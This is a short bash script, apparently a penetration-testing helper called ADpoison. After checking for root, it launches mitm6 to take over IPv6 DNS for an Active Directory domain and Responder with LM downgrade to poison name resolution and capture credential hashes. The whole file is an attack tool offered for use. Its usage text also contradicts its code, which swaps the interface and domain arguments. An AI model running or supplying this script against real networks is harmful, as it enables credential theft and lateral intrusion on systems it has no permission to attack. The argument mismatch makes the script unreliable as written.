#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi


if [ $# -eq 0 ]
  then
    echo "No arguments supplied"
fi



echo " "
echo "Syntax: ADpoison 'interface' 'domain" 
echo "Example: ./ADpoison.sh 'eth0' 'domain.local' "
echo "Starting MiTM6 on domain: " "$1"
# echo "xxx"
mitm6 -i "$2" -d "$1" -l "$1"
responder -I "$2" --lm